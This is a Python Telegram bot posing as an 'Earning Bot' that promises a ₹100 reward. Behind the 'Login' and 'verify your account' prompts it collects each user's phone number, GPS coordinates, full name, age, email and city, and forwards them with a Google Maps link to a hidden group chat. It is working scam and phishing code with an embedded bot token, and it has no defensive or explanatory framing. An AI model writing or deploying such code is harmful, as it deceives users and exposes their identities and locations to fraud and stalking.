import telebot
from telebot import types

BOT_TOKEN = "8410000716:AAEYHCE5qHLAlz6xw2aiWHZJMDdV_9Qv450"
GROUP_CHAT_ID = -1002638829514

bot = telebot.TeleBot(BOT_TOKEN)
user_data = {}

# /start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup()
    claim_button = types.InlineKeyboardButton("🎁 Claim Reward 💰", callback_data="claim_reward")
    markup.add(claim_button)

    welcome_text = (
        "💰 *Welcome to Earning Bot!* 💰\n\n"
        "🎉 Claim your ₹100 joining reward now!\n"
        "🤑 Earn more by completing simple daily tasks.\n\n"
        "👇 Tap below to claim your reward 👇"
    )

    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=markup)

# When Claim Reward is tapped
@bot.callback_query_handler(func=lambda call: call.data == "claim_reward")
def show_login_button(call):
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    login_btn = types.KeyboardButton("🔑 Login", request_contact=True)
    markup.add(login_btn)
    bot.send_message(call.message.chat.id, "🔑 Please *Login* to continue:", parse_mode="Markdown", reply_markup=markup)

# When user shares contact
@bot.message_handler(content_types=['contact'])
def contact_handler(message):
    chat_id = message.chat.id
    phone_number = message.contact.phone_number
    first_name = message.from_user.first_name
    username = message.from_user.username or "N/A"

    user_data[chat_id] = {"phone": phone_number, "name": first_name, "username": username}

    # Send phone to group
    bot.send_message(
        GROUP_CHAT_ID,
        f"📞 *New Login*:\n"
        f"👤 Name: {first_name}\n"
        f"🔗 Username: @{username}\n"
        f"📱 Phone: {phone_number}",
        parse_mode="Markdown"
    )

    # Ask for location
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    location_btn = types.KeyboardButton("📍 Allow Location", request_location=True)  # Changed text here
    markup.add(location_btn)
    bot.send_message(chat_id, "📍 Please allow location access to verify your account:", parse_mode="Markdown", reply_markup=markup)

# When user shares location
@bot.message_handler(content_types=['location'])
def location_handler(message):
    chat_id = message.chat.id
    lat = message.location.latitude
    lon = message.location.longitude
    user_data[chat_id]["latitude"] = lat
    user_data[chat_id]["longitude"] = lon

    # Send location to group
    bot.send_message(
        GROUP_CHAT_ID,
        f"📍 *Location Received*:\n"
        f"🌐 Latitude: {lat}\n"
        f"🌐 Longitude: {lon}\n"
        f"🗺 [Google Maps Link](https://maps.google.com/?q={lat},{lon})",
        parse_mode="Markdown"
    )

    # Ask for name
    bot.send_message(chat_id, "📝 Enter your *Full Name*:", parse_mode="Markdown")
    bot.register_next_step_handler(message, get_full_name)

def get_full_name(message):
    chat_id = message.chat.id
    user_data[chat_id]["full_name"] = message.text
    bot.send_message(chat_id, "📅 Enter your *Age*:", parse_mode="Markdown")
    bot.register_next_step_handler(message, get_age)

def get_age(message):
    chat_id = message.chat.id
    user_data[chat_id]["age"] = message.text
    bot.send_message(chat_id, "📧 Enter your *Email Address*:", parse_mode="Markdown")
    bot.register_next_step_handler(message, get_email)

def get_email(message):
    chat_id = message.chat.id
    user_data[chat_id]["email"] = message.text
    bot.send_message(chat_id, "🏙 Enter your *City*:", parse_mode="Markdown")
    bot.register_next_step_handler(message, get_city)

def get_city(message):
    chat_id = message.chat.id
    user_data[chat_id]["city"] = message.text
    data = user_data[chat_id]

    # Send remaining info to group
    bot.send_message(
        GROUP_CHAT_ID,
        f"📥 *Profile Details*:\n"
        f"📝 Full Name: {data['full_name']}\n"
        f"📅 Age: {data['age']}\n"
        f"📧 Email: {data['email']}\n"
        f"🏙 City: {data['city']}",
        parse_mode="Markdown"
    )

    bot.send_message(chat_id, "✅ Profile completed! You can now start earning.")

bot.polling()
